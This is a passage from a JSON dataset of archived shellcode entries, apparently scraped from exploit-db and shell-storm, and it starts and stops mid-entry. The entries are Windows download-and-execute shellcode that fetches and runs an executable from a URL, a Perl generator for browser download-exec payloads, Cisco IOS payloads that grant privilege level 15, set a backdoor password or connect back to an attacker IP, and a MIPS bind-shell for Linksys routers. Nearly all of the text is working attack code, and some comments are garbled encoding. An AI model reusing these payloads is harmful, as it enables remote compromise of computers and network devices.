SW_HIDE", "      mov dl,(@cmd_end-@cmd_start)-1              ; this allows command up to 255 bytes", "      push edi                                    ; file name to execute", "      ; ********************************************************************", "      push eax                                    ; callback routine URLDownLoadToFileA", "      push eax                                    ; reserved, must be zero", "      push edi                                    ; file name to save as", "      add edi,edx                                 ; get offset of @url_start-1", "      stosb                                       ; zero tail end", "      mov dl,(@url_end-@url_start)-1              ; limit of 255 bytes for url", "      push edi                                    ; url to download file from", "      push eax                                    ; interface", "      add edi,edx                                 ; get offset of @urlmon-1", "      stosb                                       ; zero tail end of url", "      ; *********************************************************************", "load_modules:", "      push edi                   ; save current offset to hashes", "      push 30h", "      pop ecx", "      mov eax,fs:[ecx]           ; PEB base address", "      mov eax,[eax+0ch]          ; PEB_LDR_DATA LoaderData", "      mov ebp,[eax+1ch]          ; LIST_ENTRY InMemoryOrderModuleList", "scan_dll:", "      mov ebx,[ebp+8]            ; DllBase", "      mov ebp,[ebp]              ; Flink", "      push ebp                   ; save", "", "      mov eax,[ebx+3ch]", "      mov eax,[ebx+eax+78h]\t ; IMAGE_DIRECTORY_ENTRY_EXPORT", "      lea esi,[ebx+eax+18h]\t ; offset IMAGE_EXPORT_DIRECTORY.NumberOfNames", "      lodsd", "      xchg eax,ecx               ; ecx = NumberOfNames", "      ", "      lodsd", "      add eax,ebx                ; AddressOfFunctions", "      push eax", "", "      lodsd", "      lea edi,[eax+ebx]          ; AddressOfNames", "", "      lodsd", "      lea ebp,[eax+ebx]\t\t ; ebp = AddressOfNameOrdinals", "load_api:", "      mov esi,[edi+4*ecx-4]", "      add esi,ebx", "      xor eax,eax", "      cdq", "hash_api:", "      lodsb", "      add edx,eax", "      rol edx,ROL_CONSTANT", "      dec eax", "      jns hash_api", "", "      mov esi,[esp+8]                             ; get api hashes", "      cmp dx,word ptr[esi]                        ; found a match?", "      je call_api", "", "      loop load_api", "      pop eax                                     ; check", "      pop ebp                                     ;", "      jmp scan_dll", "call_api:", "      pop eax", "      movzx edx,word ptr [ebp+2*ecx-2]", "      add ebx,[eax+4*edx]", "      pop ebp                                     ; modules", "      pop edi                                     ; api hashes", "      call ebx                                    ; call api", "      stosw                                       ; advance 2 bytes to next hash", "      jmp load_modules                             ; do another, just keep going until ExitProcess is reached.", "      ; *************************", "load_data:", "      call setup_parameters", "@cmd_start:", "      db 'file.exe',0ffh                          ; WinExec(\"file.exe\",SW_HIDE);", "@cmd_end:", "@url_start:", "      db 'http://127.0.0.1/file.exe',0ffh         ; url of file to download", "@url_end:", "      hashapi <URLDownloadToFileA>", "      hashapi <WinExec>", "      hashapi <ExitProcess>", "      ; *********************************************************************", "", "end code_start", "", "; milw0rm.com [2007-06-14]"]},
{"Title": "Windows/x86 - Download File + Execute Shellcode (192 bytes)", "Author": "czy", "Published": ": 2007-06-27", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/13516.asm", "View": "https://old.exploit-db.com/raw/13516/", "code": [";Tiny Download&&Exec ShellCode codz czy 2007.6.1", ";header 163=61(16+8+9+(28))+95(68+27)+17", ";163+19=192", "comment %", "                #--------------------------------------#          #", "              #  Tiny Download&&Exec ShellCode-->       #       #", "            #    -->size 192                              #   #", "          #                      2007.06.01                 #  ", "            #                    codz: czy                #   #", "            #                  www.ph4nt0m.org           #     #", "             #------------------------------------------#       #", "", "system :test on ie6+XPSP2/2003SP2/2kSP4", "%", ".586", ".model flat,stdcall", "option casemap:none", "", "include     c:\\masm32\\include\\windows.inc", "include     c:\\masm32\\include\\kernel32.inc", "includelib  c:\\masm32\\lib\\kernel32.lib", "include     c:\\masm32\\include\\user32.inc", "includelib  c:\\masm32\\lib\\user32.lib", "", "", ".data", "shelldatabuffer db 1024 dup(0)", "shellcodebuffer\tdb 2046 dup(0)", "downshell\tdb 'down exploit',0", ".code", "start:", "\tinvoke\tMessageBoxA,0,offset downshell,offset downshell,1", "\tinvoke\tRtlMoveMemory,offset shellcodebuffer,00401040H,256", "\tmov\teax,offset shellcodebuffer", "\tjmp\teax", "\tsomenops db 90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h", ";\u00c3\u0192\u00c2\u2030\u00c3\u0192\u00c2\u008f\u00c3\u0192\u00c2\u0192\u00c3\u0192\u00c2\u00a6\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u201e\u00c3\u201a\u00c2\u00b4\u00c3\u0192\u00c2\u00ba\u00c3\u0192\u00c2\u201a\u00c3\u0192\u00c2\u00ab\u00c3\u0192\u00c2\u0160\u00c3\u0192\u00c2\u2021\u00c3\u201a\u00c2\u00b0\u00c3\u0192\u00c2\u2018\u00c3\u0192\u00c2\u201d\u00c3\u0192\u00c2\u0161\u00c3\u201a\u00c2\u00b4\u00c3\u0192\u00c2\u00ba\u00c3\u0192\u00c2\u201a\u00c3\u0192\u00c2\u00ab\u00c3\u201a\u00c2\u00b6\u00c3\u0192\u00c2\u017d\u00c3\u0192\u00c2\u2013\u00c3\u0192\u00c2\u0090\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u201eshellcode\u00c3\u0192\u00c2\u2019\u00c3\u0192\u00c2\u2020\u00c3\u201a\u00c2\u00b6\u00c3\u201a\u00c2\u00af\u00c3\u0192\u00c2\u0160\u00c3\u0192\u00c2\u00bd\u00c3\u201a\u00c2\u00be\u00c3\u0192\u00c2\u009d\u00c3\u201a\u00c2\u00b6\u00c3\u0192\u00c2\u017d\u00c3\u0192\u00c2\u2013\u00c3\u0192\u00c2\u0090\u00c3\u0192\u00c2\u2013\u00c3\u201a\u00c2\u00b4\u00c3\u0192\u00c2\u0090\u00c3\u0192\u00c2\u0090\u00c3\u201a\u00c2\u00a3\u00c3\u201a\u00c2\u00ac\u00c3\u0192\u00c2\u201e\u00c3\u201a\u00c2\u00a3\u00c3\u0192\u00c2\u201e\u00c3\u0192\u00c2\u00a2\u00c3\u0192\u00c2\u2022\u00c3\u0192\u00c2\u00a6\u00c3\u0192\u00c2\u0160\u00c3\u201a\u00c2\u00b5\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u201eshellcode\u00c3\u0192\u00c2\u2013\u00c3\u201a\u00c2\u00b4\u00c3\u0192\u00c2\u0090\u00c3\u0192\u00c2\u0090\u00c3\u201a\u00c2\u00bb\u00c3\u201a\u00c2\u00b7\u00c3\u201a\u00c2\u00be\u00c3\u201a\u00c2\u00b3\t", "@@shellcodebegin:\t\t", "\tcall\t@@beginaddr", "@@beginaddr:", "\tPUSH 03H      ;\u00c3\u0192\u00c2\u2019\u00c3\u201a\u00c2\u00aa\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u00b7\u00c3\u0192\u00c2\u201c\u00c3\u0192\u00c2\u0192\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u201eAPI\u00c3\u201a\u00c2\u00ba\u00c3\u201a\u00c2\u00af\u00c3\u0192\u00c2\u0160\u00c3\u0192\u00c2\u00bd\u00c3\u201a\u00c2\u00b8\u00c3\u0192\u00c2\u00b6\u00c3\u0192\u00c2\u0160\u00c3\u0192\u00c2\u00bd", "\tjmp\t@@realshellcode          ", "myExitProcess     dd 073e2d87eh   ", "myWinExec         dd 00e8afe98h    ", "myLoadLibraryA    dd 0ec0e4e8eh", "dll               db 'URLMON',0,0", "myUrlDownFile     dd 0702f1a36h", "path              db 'c:\\a.exe',0", "url               db 'http://www.ph4nt0m.org/a.exe',0", "", "", "", "@@realshellcode:", "    POP ECX", "    POP EDI", "    SCASD ;edi+4", ";\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u0192\u00c3\u201a\u00c2\u00b5\u00c3\u201a\u00c2\u00bdkernel32.dll\u00c3\u201a\u00c2\u00bb\u00c3\u0192\u00c2\u00b9\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u02dc\u00c3\u0192\u00c2\u2013\u00c3\u201a\u00c2\u00b7", "db  67h,64h,0A1h,30h,00h", "\tmov eax, [eax+0cH]", "\tmov esi, [eax+1cH]", "    lodsd ", "\tmov ebp, [eax+08H]          ;EBP\u00c3\u0192\u00c2\u2013\u00c3\u0192\u00c2\u0090\u00c3\u201a\u00c2\u00b4\u00c3\u0192\u00c2\u00a6\u00c3\u201a\u00c2\u00b7\u00c3\u0192\u00c2\u2026kernel32.dll\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u201e\u00c3\u201a\u00c2\u00bb\u00c3\u0192\u00c2\u00b9\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u02dc\u00c3\u0192\u00c2\u2013\u00c3\u201a\u00c2\u00b7", ";\u00c3\u201a\u00c2\u00b4\u00c3\u201a\u00c2\u00a6\u00c3\u0192\u00c2\u20ac\u00c3\u0192\u00c2\u00ad\u00c3\u201a\u00c2\u00b5\u00c3\u201a\u00c2\u00bc\u00c3\u201a\u00c2\u00b3\u00c3\u0192\u00c2\u00b6\u00c3\u201a\u00c2\u00b1\u00c3\u0192\u00c2\u00ad", "@@next2:", "PUSH      ECX", "@@next3:", "MOV       ESI,[EBP+3Ch]", "MOV       ESI,[EBP+ESI+78h]", "ADD       ESI,EBP", "PUSH      ESI", "MOV       ESI,[ESI+20h]", "ADD       ESI,EBP", "XOR       ECX,ECX", "DEC       ECX", "@@next:", "INC       ECX", "LODSD", "ADD       EAX,EBP", "XOR       EBX,EBX", "@@again:", "    MOVSX     EDX,BYTE PTR [EAX]", "    CMP       DL,DH", "    JZ        @@end", "    ROR       EBX,0Dh", "    ADD       EBX,EDX", "    INC       EAX", "    JMP       @@again", "@@end:", "CMP       EBX,[EDI]", "JNZ       @@next", "", "POP       ESI", "MOV       EBX,[ESI+24h]", "ADD       EBX,EBP", "MOV       CX,WORD PTR [ECX*2+EBX]", "MOV       EBX,[ESI+1Ch]", "ADD       EBX,EBP", "MOV       EAX,[ECX*4+EBX]", "ADD       EAX,EBP", "STOSD", "POP       ECX", "loop @@next2", "", "mov ecx,[edi]   ;2", "cmp cl,'c'      ;3", "jz @@downfile   ;2", "PUSH EDI", "CALL EAX        ;2", "xchg eax,ebp", "scasd", "scasd", "push 01         ;2\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u0161\u00c3\u201a\u00c2\u00b6\u00c3\u0192\u00c2\u00be\u00c3\u201a\u00c2\u00b8\u00c3\u0192\u00c2\u00b6DLL\u00c3\u201a\u00c2\u00b5\u00c3\u0192\u00c2\u201e\u00c3\u201a\u00c2\u00ba\u00c3\u201a\u00c2\u00af\u00c3\u0192\u00c2\u0160\u00c3\u0192\u00c2\u00bd\u00c3\u201a\u00c2\u00b8\u00c3\u0192\u00c2\u00b6\u00c3\u0192\u00c2\u0160\u00c3\u0192\u00c2\u00bd", "jmp @@next3     ;2", "                ;\u00c3\u0192\u00c2\u2014\u00c3\u0192\u00c2\u0153\u00c3\u201a\u00c2\u00bc\u00c3\u0192\u00c2\u202017", "", "         ", "@@downfile:", "", "\tpush\tedx  ;0", "\tpush\tedx  ;0", "\tpush    edi  ;file=c:\\a.exe", "\tlea     ecx, dword ptr [edi+9h]", "\tpush    ecx  ;url", "\tpush\tedx  ;0", "\tcall\teax  ;URLDownloadToFileA,0,url,file=c:\\a.exe,0,0", "\t", "\t", "\tpush 1 ;FOR TEST", "\tpush edi", "\tcall dword ptr [edi-14H] ;winexec,'c:\\xxx.exe',1", "\t", "    call dword ptr [edi-18H] ;Exitprocess", "", "    somenops2 db 90h,90h,90h,90h,90h,90h,90h,90h,90h", "    invoke ExitProcess,0", "end start", "", "; milw0rm.com [2007-06-27]"]},
{"Title": "Windows/x86 - Download File + Execute Shellcode (Browsers Edition) (275+ bytes) (Generator)", "Author": "YAG KOHHA", "Published": ": 2008-03-14", "Platform": "Generator", "Download": "http://shell-storm.org/shellcode/files/shellcode-159.php", "View": null, "code": ["#!/usr/bin/perl", "", "$loading_url=$ARGV[0];", "chomp ($loading_url);", "my @buffer;", "", "if ($loading_url eq \"\") {", "$sco = 'ERROR!!! Enter url to remote exe.';", "buffer_gen($sco);", "print @buffer;", "exit;", "}", "", "$c= generate_char(0);", "", "$sco= \"\\xE8\\x56\\x00\\x00\\x00\\x53\\x55\\x56\\x57\\x8B\\x6C\\x24\\x18\\x8B\\x45\".", "      \"\\x3C\\x8B\\x54\\x05\\x78\\x01\\xEA\\x8B\\x4A\\x18\\x8B\\x5A\\x20\\x01\\xEB\".", "      \"\\xE3\\x32\\x49\\x8B\\x34\\x8B\\x01\\xEE\\x31\\xFF\\xFC\\x31\\xC0\\xAC\\x38\".", "      \"\\xE0\\x74\\x07\\xC1\\xCF\\x0D\\x01\\xC7\\xEB\\xF2\\x3B\\x7C\\x24\\x14\\x75\".", "      \"\\xE1\\x8B\\x5A\\x24\\x01\\xEB\\x66\\x8B\\x0C\\x4B\\x8B\\x5A\\x1C\\x01\\xEB\".", "      \"\\x8B\\x04\\x8B\\x01\\xE8\\xEB\\x02\\x31\\xC0\\x5F\\x5E\\x5D\\x5B\\xC2\\x08\".", "      \"\\x00\\x5E\\x6A\\x30\\x59\\x64\\x8B\\x19\\x8B\\x5B\\x0C\\x8B\\x5B\\x1C\\x8B\".", "      \"\\x1B\\x8B\\x5B\\x08\\x53\\x68\\x8E\\x4E\\x0E\\xEC\\xFF\\xD6\\x89\\xC7\\x53\".", "      \"\\x68\\x8E\\x4E\\x0E\\xEC\\xFF\\xD6\\xEB\\x50\\x5A\\x52\\xFF\\xD0\\x89\\xC2\".", "      \"\\x52\\x52\\x53\\x68\\xAA\\xFC\\x0D\\x7C\\xFF\\xD6\\x5A\\xEB\\x4D\\x59\\x51\".", "      \"\\x52\\xFF\\xD0\\xEB\\x72\\x5A\\xEB\\x5B\\x59\\x6A\\x00\\x6A\\x00\\x51\\x52\".", "      \"\\x6A\\x00\\xFF\\xD0\\x53\\x68\\xA0\\xD5\\xC9\\x4D\\xFF\\xD6\\x5A\\x52\\xFF\".", "      \"\\xD0\\x53\\x68\\x98\\xFE\\x8A\\x0E\\xFF\\xD6\\xEB\\x44\\x59\\x6A\\x00\\x51\".", "      \"\\xFF\\xD0\\x53\\x68\\x7E\\xD8\\xE2\\x73\\xFF\\xD6\\x6A\\x00\\xFF\\xD0\\xE8\".", "      \"\\xAB\\xFF\\xFF\\xFF\\x75\\x72\\x6C\\x6D\\x6F\\x6E\\x2E\\x64\\x6C\\x6C\\x00\".", "      \"\\xE8\\xAE\\xFF\\xFF\\xFF\\x55\\x52\\x4C\\x44\\x6F\\x77\\x6E\\x6C\\x6F\\x61\".", "      \"\\x64\\x54\\x6F\\x46\\x69\\x6C\\x65\\x41\\x00\\xE8\\xA0\\xFF\\xFF\\xFF\\x2E\".", "      \"\\x2E\\x5C\".$c.\"\\x00\\xE8\\xB7\\xFF\\xFF\\xFF\\x2E\\x2E\\x5C\".$c.\"\\x00\".", "      \"\\xE8\\x89\\xFF\\xFF\\xFF\".$loading_url.\"\\x00\";", "", "$sco=convert_sco($sco);", "buffer_gen($sco);", "print @buffer;", "", "sub generate_char()", "{", " my $wdsize = shift;", " my @alphanumeric = ('a'..'z');", " my $wd = join '',", " map $alphanumeric[rand @alphanumeric], 0..$wdsize;", "  return $wd;", "}", "", "sub convert_sco {", "        my $data = shift;", "        my $mode = shift() || 'LE';", "        my $code = '';", "", "        my $idx = 0;", "", "        if (length($data) % 2 != 0) {", "                $data .= substr($data, -1, 1);", "        }", "", "        while ($idx < length($data) - 1) {", "                my $c1 = ord(substr($data, $idx, 1));", "                my $c2 = ord(substr($data, $idx+1, 1));", "                if ($mode eq 'LE') {", "                        $code .= sprintf('%%u%.2x%.2x', $c2, $c1);", "                } else {", "                        $code .= sprintf('%%u%.2x%.2x', $c1, $c2);", "                }", "                $idx += 2;", "        }", "", "        return $code;", "}", "", "sub buffer_gen(){", "$sco = shift;", "@buffer=<<FX;", "", "    Win32 Download and Execute Shellcode Generator (browsers edition)", "    Size: 275 bytes + loading_url", "    Author: Yag Kohha (skyhole [at] gmail.com)", "    ", "    Usage: ./sco http://remote_server/loader.exe", "    ", "    Greetz to:", "     str0ke \\& milw0rm project", "     shinnai", "     h07", "     rgod", "     H.D. Moor \\& Metaspl0it", "     offtopic", "     3APA3A", "    ", "-------> Start", "", "$sco", "", "-------> End", "FX", "", "}", "", "# milw0rm.com [2008-03-14]"]},
{"Title": "Cisco IOS - New TTY + Privilege Level To 15 + Reverse (21/TCP) Virtual Terminal Shell Shellcode", "Author": "Gyan Chawdhary", "Published": ": 2008-08-13", "Platform": "Hardware", "Download": "http://shell-storm.org/shellcode/files/shellcode-144.php", "View": null, "code": ["# ----------------------------------------------------------------------------------------", "#", "# Cisco IOS Connectback shellcode v1.0", "# (c) 2007 IRM Plc", "# By Gyan Chawdhary", "#", "# ----------------------------------------------------------------------------------------", "#", "# The code creates a new TTY, allocates a shell with privilege level 15 and connects back ", "# on port 21", "#", "# This shellcode can be used as the payload for any IOS exploit on a PowerPC-based device.", "# ", "#", "# The following five hard-coded addresses must be located for the target IOS version. ", "#", "# The hard-coded addresses used here are for:", "#", "# IOS (tm) C2600 Software (C2600-IK9S-M), Version 12.3(22), RELEASE SOFTWARE (fc2)", "#", "# ----------------------------------------------------------------------------------------", ".equ malloc, 0x804785CC", ".equ allocate_tty, 0x803d155c", ".equ ret, 0x804a42e8", ".equ addr, 0x803c4ad8 ", ".equ str, 0x81e270b4", ".equ tcp_connect, 0x80567568", ".equ tcp_execute_command, 0x8056c354", ".equ login, 0x8359b1f4", ".equ god, 0xff100000", ".equ priv, 0x8359be64", "# ----------------------------------------------------------------------------------------", "", "main:", "\tstwu 1,-48(1)", "\tmflr 0", "\tstw 31,44(1)", "\tstw 0,52(1)", "\tmr 31,1", "\tli 3,512", "\tlis 9,malloc@ha  #malloc() memory for tcp structure", "\tla 9,malloc@l(9)", "\tmtctr 9", "\tbctrl", "\tmr 0,3", "\tstw 0,20(31)", "\tlwz 9,12(31)", "\tli 0,1", "\tstb 0,0(9)", "\tlwz 9,12(31)", "\tlis 0,0xac1e #  connect back ip address ", "\tori 0,0,1018 #", "\tstw 0,4(9)", "\tli 3,66", "\tli 4,0", "\tlis 9,allocate_tty@ha  # allocate new TTY", "\tla 9,allocate_tty@l(9)", "\tmtctr 9", "\tbctrl", "\taddi 0,31,24", "", "\t# Fix TTY structure to enable level 15 shell without password", "\t# ", "\t#", "\t##########################################################", "", "\t# login patch begin", "\tlis 9, login@ha", "\tla 9, login@l(9)", "\tli 8,0", "\tstw 8, 0(9)", "\t# login patch end", "", "\t#IDA placeholder for con0", "\t#", "\t# lis     %r9, ((stdio+0x10000)@h)", "        # lwz     %r9, stdio@l(%r9)", "        # lwz     %r0, 0xDE4(%r9) #priv struct", "        #", "\t# priv patch begin", "\tlis 9, priv@ha", "\tla 9, priv@l(9)", "\tlis 8, god@ha", "\tla 8, god@l(8)", "\tstw 8, 0(9)", "\t# priv patch end ", "\t", "\t###########################################################", "", "\tli 3,0", "\tli 4,21\t\t# Port 21 for connectback", "\tlwz 5,12(31)", "\tli 6,0", "\tli 7,0", "\tmr 8,0", "\tli 9,0", "\tlis 11,tcp_connect@ha \t# Connect to attacker IP", "\tla 11,tcp_connect@l(11)", "\tmtctr 11", "\tbctrl", "\tmr 0,3", "\tstw 0,20(31)", "\tli 3,66", "\tlwz 4,20(31)", "\tli 5,0", "\tli 6,0", "\tli 7,0", "\tli 8,0", "\tli 9,0", "\tli 10,0", "\tlis 11,tcp_execute_command@ha   # Execute Virtual Terminal on outgoing connection, similar to /bin/bash", "\tla 11,tcp_execute_command@l(11)", "\tmtctr 11", "\tbctrl", "\tlwz 11,0(1)", "\tlwz 0,4(11)", "\tmtlr 0", "\tlwz 31,-4(11)", "\tmr 1,11", "", "\t###########################################", "\tlis     9, addr@ha\t\t", "        addi    0, 9, addr@l", "        mtctr   0", "        xor 3,3,3", "        addi    3,0, -2", "        lis     10, str@ha", "        addi    4, 10, str@l", "        bctrl", "        lis     10, ret@ha", "        addi    4, 10, ret@l", "        mtctr   4", "        bctrl", "", "# milw0rm.com [2008-08-13]"]},
{"Title": "Cisco IOS/PowerPC - New VTY + Password (1rmp455) Shellcode (116 bytes)", "Author": "Varun Uppal", "Published": ": 2008-08-13", "Platform": "Hardware", "Download": "http://shell-storm.org/shellcode/files/shellcode-143.php", "View": null, "code": ["# ----------------------------------------------------------------------------------------", "#", "# Cisco IOS Bind shellcode v1.0", "# (c) 2007 IRM Plc", "# By Varun Uppal", "#", "# ----------------------------------------------------------------------------------------", "#", "# The code creates a new VTY, allocates a password then sets the privilege level to 15", "#", "# This shellcode can be used as the payload for any IOS exploit on a PowerPC-based device.", "# Once assembled, the payload is only 116 bytes in length ", "#", "# The following four hard-coded addresses must be located for the target IOS version. ", "# Version 1.1 of the shellcode will auto-locate these values and make the code ", "# IOS-version-independent", "#", "# The hard-coded addresses used here are for:", "#", "# IOS (tm) C2600 Software (C2600-IK9S-M), Version 12.3(22), RELEASE SOFTWARE (fc2)", "#", "# ----------------------------------------------------------------------------------------", ".equ makenewvty, 0x803d0d08", ".equ malloc, 0x804785cc", ".equ setpwonline, 0x803b9e90", ".equ linesstruct, 0x82f9e334", "# ----------------------------------------------------------------------------------------", "", ".equ priv, 0xf1000000\t\t#value used to set the privilege level", "", "main:\tli 3,71\t\t\t#new vty line = 71", "\tlis 9,makenewvty@ha", "\tla 9,makenewvty@l(9)", "\tmtctr 9", "\tbctrl\t\t\t#makenewvty()", "", "\tli 3,0x1e5c", "\tlis 9,malloc@ha", "\tla 9,malloc@l(9)", "\tmtctr 9", "\tbctrl\t\t\t#malloc() memory for structure", "", "\tli 4,70\t\t", "\tstw 4,0xa68(3)", "\tli 5,72\t\t", "\tstw 5,0xa6c(3)", "\tli 4,0x00\t\t", "\tbl setp\t\t\t#pointer to the password into LR", "", ".string \"1rmp455\"\t\t#the password for the line", "", "setp:\tmflr 5", "\tlis 9,setpwonline@ha", "      \tla 9,setpwonline@l(9)", "      \tmtctr 9", "      \tbctrl\t\t\t#setpwonline()", "", "\tlis 8,linesstruct@ha", "      \tla 8,linesstruct@l(8)", "\tlwz 9,0(8)", "\tlis 7,priv@ha", "     \tla 7,priv@l(7)", "\tstw 7,0xde4(9)\t\t#set privilege level to 15", "", "# milw0rm.com [2008-08-13]"]},
{"Title": "Cisco IOS - New TTY + Privilege Level To 15 + No Password Shellcode", "Author": "Gyan Chawdhary", "Published": ": 2008-08-13", "Platform": "Hardware", "Download": "http://shell-storm.org/shellcode/files/shellcode-142.php", "View": null, "code": ["# ----------------------------------------------------------------------------------------", "#", "# Cisco IOS Tiny shellcode v1.0", "# (c) 2007 IRM Plc", "# By Gyan Chawdhary", "#", "# ----------------------------------------------------------------------------------------", "#", "# The code creates a new TTY, and sets the privilege level to 15 without a password", "#", "# This shellcode can be used as the payload for any IOS exploit on a PowerPC-based device.", "# ", "#", "# The following two hard-coded addresses must be located for the target IOS version. ", "#", "# The hard-coded addresses used here are for:", "#", "# IOS (tm) C2600 Software (C2600-IK9S-M), Version 12.3(22), RELEASE SOFTWARE (fc2)", "#", "# ----------------------------------------------------------------------------------------", ".equ ret, 0x804a42e8", ".equ login, 0x8359b1f4", ".equ god, 0xff100000", ".equ priv, 0x8359be64", "# ----------------------------------------------------------------------------------------", "", "main:", "", "\t# login patch begin", "\tlis 9, login@ha", "\tla 9, login@l(9)", "\tli 8,0", "\tstw 8, 0(9)", "\t# login patch end", "", "\t# priv patch begin", "\tlis 9, priv@ha", "\tla 9, priv@l(9)", "\tlis 8, god@ha", "\tla 8, god@l(8)", "\tstw 8, 0(9)", "\t# priv patch end ", "\t", "\t# exit code", "      lis     10, ret@ha", "      addi    4, 10, ret@l", "      mtctr   4", "      bctrl", "", "# milw0rm.com [2008-08-13]"]},
{"Title": "Linux/MIPS (Linksys WRT54G/GL) - Bind (4919/TCP) Shell (/bin/sh) Shellcode (276 bytes)", "Author": "vaicebine", "Published": ": 2008-08-18", "Platform": "Linux_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-81.php", "View": null, "code": ["/*\t- MIPS little-endian ", " *\t- linux port listener 276 bytes shellcode ", " *\t- execve(\"/bin/sh\",[\"/bin/sh\"],[]);", " *\t- port 0x1337 (4919)", " *\t- tested on Linksys WRT54G/GL (DD-WRT Linux)", " *      - based on scut paper Writing MIPS/Irix shellcode", " *", " * \t\t\t\tvaicebine at gmail dot com", " */", "#include <stdio.h>", "", "char port_bind_shellcode[] = ", "\t\"\\xe0\\xff\\xbd\\x27\"\t/*     addiu   sp,sp,-32                */", "\t\"\\xfd\\xff\\x0e\\x24\"\t/*     li      t6,-3                    */", "\t\"\\x27\\x20\\xc0\\x01\"\t/*     nor     a0,t6,zero               */", "\t\"\\x27\\x28\\xc0\\x01\"\t/*     nor     a1,t6,zero               */", "\t\"\\xff\\xff\\x06\\x28\"\t/*     slti    a2,zero,-1               */\t", "\t\"\\x57\\x10\\x02\\x24\"\t/*     li      v0,4183 ( __NR_socket )  */", "\t\"\\x0c\\x01\\x01\\x01\"\t/*     syscall                          */", "\t\"\\x50\\x73\\x0f\\x24\"\t/*     li      t7,0x7350 (nop)          */", "\t\"\\xff\\xff\\x50\\x30\"\t/*     andi    s0,v0,0xffff             */\t", "\t\"\\xef\\xff\\x0e\\x24\"\t/*     li      t6,-17                   */", "\t\"\\x27\\x70\\xc0\\x01\"\t/*     nor     t6,t6,zero               */", "\t\"\\x13\\x37\\x0d\\x24\"\t/*     li      t5,0x3713 (port 0x1337)  */", "\t\"\\x04\\x68\\xcd\\x01\"\t/*     sllv    t5,t5,t6                 */", "\t\"\\xff\\xfd\\x0e\\x24\"\t/*     li      t6,-513                  */", "\t\"\\x27\\x70\\xc0\\x01\"\t/*     nor     t6,t6,zero               */", "\t\"\\x25\\x68\\xae\\x01\"\t/*     or      t5,t5,t6                 */", "\t\"\\xe0\\xff\\xad\\xaf\"\t/*     sw      t5,-32(sp)               */", "\t\"\\xe4\\xff\\xa0\\xaf\"\t/*     sw      zero,-28(sp)             */\t", "\t\"\\xe8\\xff\\xa0\\xaf\"\t/*     sw      zero,-24(sp)             */", "\t\"\\xec\\xff\\xa0\\xaf\"\t/*     sw      zero,-20(sp)             */", "\t\"\\x25\\x20\\x10\\x02\"\t/*     or      a0,s0,s0                 */", "\t\"\\xef\\xff\\x0e\\x24\"\t/*     li      t6,-17                   */", "\t\"\\x27\\x30\\xc0\\x01\"\t/*     nor     a2,t6,zero               */", "\t\"\\xe0\\xff\\xa5\\x23\"\t/*     addi    a1,sp,-32                */", "\t\"\\x49\\x10\\x02\\x24\"\t/*     li      v0,4169 ( __NR_bind )    */", "\t\"\\x0c\\x01\\x01\\x01\"\t/*     syscall                          */", "\t\"\\x50\\x73\\x0f\\x24\"\t/*     li      t7,0x7350 (nop)          */", "\t\"\\x25\\x20\\x10\\x02\"\t/*     or      a0,s0,s0                 */", "\t\"\\x01\\x01\\x05\\x24\"\t/*     li      a1,257                   */", "\t\"\\x4e\\x10\\x02\\x24\"\t/*     li      v0,4174 ( __NR_listen )  */\t", "\t\"\\x0c\\x01\\x01\\x01\"\t/*     syscall                          */", "\t\"\\x50\\x73\\x0f\\x24\"\t/*     li      t7,0x7350 (nop)          */", "\t\"\\x25\\x20\\x10\\x02\"\t/*     or      a0,s0,s0                 */", "\t\"\\xff\\xff\\x05\\x28\"\t/*     slti    a1,zero,-1               */", "\t\"\\xff\\xff\\x06\\x28\"\t/*     slti    a2,zero,-1               */", "\t\"\\x48\\x10\\x02\\x24\"\t/*     li      v0,4168 ( __NR_accept )  */", "\t\"\\x0c\\x01\\x01\\x01\"\t/*     syscall                          */", "\t\"\\x50\\x73\\x0f\\x24\"\t/*     li      t7,0x7350 (nop)          */", "\t\"\\xff\\xff\\x50\\x30\"\t/*     andi    s0,v0,0xffff             */\t", "\t\"\\x25\\x20\\x10\\x02\"\t/*     or      a0,s0,s0                 */", "\t\"\\xfd\\xff\\x0f\\x24\"\t/*     li      t7,-3                    */", "\t\"\\x27\\x28\\xe0\\x01\"\t/*     nor     a1,t7,zero               */", "\t\"\\xdf\\x0f\\x02\\x24\"\t/*     li      v0,4063 ( __NR_dup2 )    */", "\t\"\\x0c\\x01\\x01\\x01\"\t/*     syscall                          */", "\t\"\\x50\\x73\\x0f\\x24\"\t/*     li      t7,0x7350 (nop)          */", "\t\"\\x25\\x20\\x10\\x02\"\t/*     or      a0,s0,s0                 */", "\t\"\\x01\\x01\\x05\\x28\"\t/*     slti    a1,zero,0x0101           */", "\t\"\\xdf\\x0f\\x02\\x24\"\t/*     li      v0,4063 ( __NR_dup2 )    */", "\t\"\\x0c\\x01\\x01\\x01\"\t/*     syscall                          */", "\t\"\\x50\\x73\\x0f\\x24\"\t/*     li      t7,0x7350 (nop)          */", "\t\"\\x25\\x20\\x10\\x02\"\t/*     or      a0,s0,s0                 */", "\t\"\\xff\\xff\\x05\\x28\"\t/*     slti    a1,zero,-1               */\t", "\t\"\\xdf\\x0f\\x02\\x24\"\t/*     li      v0,4063 ( __NR_dup2 )    */", "\t\"\\x0c\\x01\\x01\\x01\"\t/*     syscall                          */", "\t\"\\x50\\x73\\x0f\\x24\"\t/*     li      t7,0x7350 (nop)          */", "\t\"\\x50\\x73\\x06\\x24\"\t/*     li      a2,0x7350                */", "\t\"\\xff\\xff\\xd0\\x04\"\t/* LB: bltzal  a2,LB                    */", "\t\"\\x50\\x73\\x0f\\x24\"\t/*     li      t7,0x7350 (nop)          */", "\t\"\\xff\\xff\\x06\\x28\"\t/*     slti    a2,zero,-1               */", "\t\"\\xdb\\xff\\x0f\\x24\"\t/*     li      t7,-37                   */", "\t\"\\x27\\x78\\xe0\\x01\"\t/*     nor     t7,t7,zero               */", 